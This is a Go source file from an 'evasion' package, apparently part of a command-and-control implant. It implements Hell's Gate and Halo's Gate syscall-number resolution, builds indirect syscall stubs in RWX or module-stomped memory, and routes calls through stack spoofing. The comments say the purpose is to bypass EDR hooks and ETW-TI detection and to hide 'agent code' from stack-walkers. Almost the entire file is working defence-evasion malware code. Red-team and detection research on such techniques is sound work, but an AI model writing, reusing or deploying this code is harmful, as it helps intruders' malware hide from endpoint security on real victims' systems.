//go:build windows
// +build windows

package evasion

// Hell's Gate + Halo's Gate — dynamic syscall number discovery.
//
// 1. Walk ntdll export table, find the target Nt* function.
// 2. Read the first bytes: if clean (4C 8B D1 B8 ...) extract SSN directly.
// 3. If hooked (first byte != 4C), scan neighbouring exports up/down for an
//    unhooked stub and deduce the SSN by offset (Halo's Gate).
// 4. Allocate a private RWX trampoline and write an 11-byte stub:
//      mov r10, rcx   ; 4C 8B D1
//      mov eax, <SSN> ; B8 lo hi 00 00
//      syscall        ; 0F 05
//      ret            ; C3
// 5. Invoke via syscall.SyscallN — Go's Windows runtime calls the trap arg
//    as a function pointer, so our stub executes directly.

import (
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// hgStubSize is the size of an indirect syscall stub:
//   mov r10, rcx      3
//   mov eax, SSN      5
//   mov rax, imm64   10  (absolute address of syscall instr inside ntdll)
//   jmp rax           2
//                    ──
//                    20
const hgStubSize = 20

// hgFindSyscallInstruction scans ntdll's first executable section for a
// "syscall; ret" (0F 05 C3) sequence and returns the address of the syscall
// byte. When the indirect stub jumps here, the CPU executes syscall while the
// instruction pointer is inside ntdll — the kernel sees a legitimate ntdll
// syscall rather than one originating from our private RWX allocation.
func hgFindSyscallInstruction() uintptr {
	base := hgNtdllBase()
	if base == 0 {
		return 0
	}
	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	peBase := base + uintptr(e_lfanew)
	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))
	sectionBase := peBase + 24 + uintptr(optHeaderSize)
	const (
		sectionHeaderSize  = 40
		sectionVSizeOffset = 8
		sectionVAOffset    = 12
		sectionCharOffset  = 36
		imageScnMemExecute = 0x20000000
	)
	for i := uint16(0); i < numSections; i++ {
		sh := sectionBase + uintptr(i)*sectionHeaderSize
		if *(*uint32)(unsafe.Pointer(sh+sectionCharOffset))&imageScnMemExecute == 0 {
			continue
		}
		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
		if va == 0 || vsz < 3 {
			continue
		}
		start := base + uintptr(va)
		for off := uintptr(0); off < uintptr(vsz)-2; off++ {
			if *(*byte)(unsafe.Pointer(start+off)) == 0x0F &&
				*(*byte)(unsafe.Pointer(start+off+1)) == 0x05 &&
				*(*byte)(unsafe.Pointer(start+off+2)) == 0xC3 {
				return start + off
			}
		}
	}
	return 0
}

var (
	hgSyscallOnce        sync.Once
	hgSyscallInstruction uintptr // address of "syscall" (0F 05) inside ntdll
)

func getSyscallInstruction() uintptr {
	hgSyscallOnce.Do(func() {
		hgSyscallInstruction = hgFindSyscallInstruction()
	})
	return hgSyscallInstruction
}

// hgExtractSSN reads the syscall number from a clean ntdll stub.
func hgExtractSSN(addr uintptr) (uint16, bool) {
	if addr == 0 {
		return 0, false
	}
	b := (*[8]byte)(unsafe.Pointer(addr))
	// Clean x64 stub: 4C 8B D1 (mov r10,rcx)  B8 lo hi 00 00 (mov eax,N)
	if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
		return uint16(b[4]) | uint16(b[5])<<8, true
	}
	return 0, false
}

// hgNtdllBase returns ntdll.dll base address via GetModuleHandleEx.
func hgNtdllBase() uintptr {
	var h windows.Handle
	name, _ := windows.UTF16PtrFromString(sNtdll())
	_ = windows.GetModuleHandleEx(0, name, &h)
	return uintptr(h)
}

// hgExports returns (numberOfNames, namesRVA array, ordinalsRVA array, funcsRVA array)
// base-absolute pointers into the mapped ntdll image.
func hgExports(base uintptr) (count uint32, names, ords, funcs uintptr, ok bool) {
	if base == 0 {
		return
	}
	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	// PE32+ optional header: DataDirectory[0] at offset 0x88 from PE signature
	exportDirRVA := *(*uint32)(unsafe.Pointer(base + uintptr(e_lfanew) + 0x88))
	if exportDirRVA == 0 {
		return
	}
	ed := base + uintptr(exportDirRVA)
	count = *(*uint32)(unsafe.Pointer(ed + 0x18)) // NumberOfNames
	funcs = base + uintptr(*(*uint32)(unsafe.Pointer(ed + 0x1C)))
	names = base + uintptr(*(*uint32)(unsafe.Pointer(ed + 0x20)))
	ords  = base + uintptr(*(*uint32)(unsafe.Pointer(ed + 0x24)))
	ok = true
	return
}

func hgCStr(addr uintptr) string {
	var b [256]byte
	for i := range b {
		c := *(*byte)(unsafe.Pointer(addr + uintptr(i)))
		if c == 0 {
			return string(b[:i])
		}
		b[i] = c
	}
	return string(b[:])
}

// hgFindSSN resolves a syscall number for a named Nt* function.
func hgFindSSN(funcName string) (uint16, bool) {
	base := hgNtdllBase()
	count, names, ords, funcs, ok := hgExports(base)
	if !ok {
		return 0, false
	}

	for i := uint32(0); i < count; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(names + uintptr(i*4)))
		name := hgCStr(base + uintptr(nameRVA))
		if name != funcName {
			continue
		}
		ord := uint32(*(*uint16)(unsafe.Pointer(ords + uintptr(i*2))))
		funcAddr := base + uintptr(*(*uint32)(unsafe.Pointer(funcs + uintptr(ord*4))))

		// Direct extraction
		if ssn, ok2 := hgExtractSSN(funcAddr); ok2 {
			return ssn, true
		}

		// Halo's Gate: scan up/down for unhooked neighbour
		for delta := uint32(1); delta <= 32; delta++ {
			if ord >= delta {
				addr := base + uintptr(*(*uint32)(unsafe.Pointer(funcs + uintptr((ord-delta)*4))))
				if ssn, ok2 := hgExtractSSN(addr); ok2 {
					return ssn + uint16(delta), true
				}
			}
			if ord+delta < count {
				addr := base + uintptr(*(*uint32)(unsafe.Pointer(funcs + uintptr((ord+delta)*4))))
				if ssn, ok2 := hgExtractSSN(addr); ok2 {
					return ssn - uint16(delta), true
				}
			}
		}
		return 0, false
	}
	return 0, false
}

// hgAlloc returns executable memory for a stub.
// Tries module stomping first (MEM_IMAGE, no private RWX) and falls back to
// a private VirtualAlloc (MEM_PRIVATE RWX) if stomping is unavailable.
func hgAlloc(size uint32) uintptr {
	if addr := stompAlloc(size); addr != 0 {
		return addr
	}
	addr, _, _ := modKernel32.NewProc("VirtualAlloc").Call(
		0, uintptr(size), 0x3000, 0x40,
	)
	return addr
}

// HGProc is a dynamically-built syscall stub for one Nt* function.
type HGProc struct {
	stub uintptr
}

// NewHGProc builds an indirect syscall stub for the named Nt* function.
//
// The stub sets up SSN and NT ABI registers, then jumps to a "syscall; ret"
// instruction inside ntdll.dll so the kernel sees the syscall IP as ntdll —
// not as our private RWX allocation.  Indirect variant bypasses kernel-level
// callbacks that flag syscalls originating outside ntdll (e.g. ETW-TI).
//
// Stub layout (20 bytes):
//   4C 8B D1              mov r10, rcx
//   B8 lo hi 00 00        mov eax, SSN
//   48 B8 xx..xx          mov rax, <ntdll syscall instr addr>
//   FF E0                 jmp rax
//
// Falls back to a direct stub (syscall; ret) if no ntdll syscall instruction
// is found, preserving functionality at the cost of the indirect property.
func NewHGProc(name string) *HGProc {
	ssn, ok := hgFindSSN(name)
	if !ok {
		return nil
	}
	addr := hgAlloc(hgStubSize)
	if addr == 0 {
		return nil
	}
	s := (*[hgStubSize]byte)(unsafe.Pointer(addr))

	// mov r10, rcx
	s[0] = 0x4C; s[1] = 0x8B; s[2] = 0xD1
	// mov eax, SSN
	s[3] = 0xB8
	s[4] = byte(ssn); s[5] = byte(ssn >> 8); s[6] = 0x00; s[7] = 0x00

	syscallIP := getSyscallInstruction()
	if syscallIP != 0 {
		// mov rax, <ntdll syscall addr>  (REX.W B8 + 8-byte imm)
		s[8] = 0x48; s[9] = 0xB8
		s[10] = byte(syscallIP)
		s[11] = byte(syscallIP >> 8)
		s[12] = byte(syscallIP >> 16)
		s[13] = byte(syscallIP >> 24)
		s[14] = byte(syscallIP >> 32)
		s[15] = byte(syscallIP >> 40)
		s[16] = byte(syscallIP >> 48)
		s[17] = byte(syscallIP >> 56)
		// jmp rax
		s[18] = 0xFF; s[19] = 0xE0
	} else {
		// Fallback: direct syscall stub (IP from our RWX alloc)
		s[8] = 0x0F; s[9] = 0x05   // syscall
		s[10] = 0xC3                // ret
		// bytes 11-19 are zero (nop-equivalent after ret)
	}

	// Flip from RWX to RX — stomped pages (MEM_IMAGE) no longer appear as
	// private RWX; private-fallback pages remain RWX (unavoidable).
	stompFinalize(addr, hgStubSize)

	return &HGProc{stub: addr}
}

// Call invokes the stub, routing through SpoofedSyscall so that EDR
// stack-walkers see an ntdll return address rather than agent code.
func (p *HGProc) Call(args ...uintptr) (r1, r2 uintptr, err syscall.Errno) {
	if p == nil || p.stub == 0 {
		return 0, 0, syscall.EINVAL
	}
	return SpoofedSyscall(p.stub, args...)
}
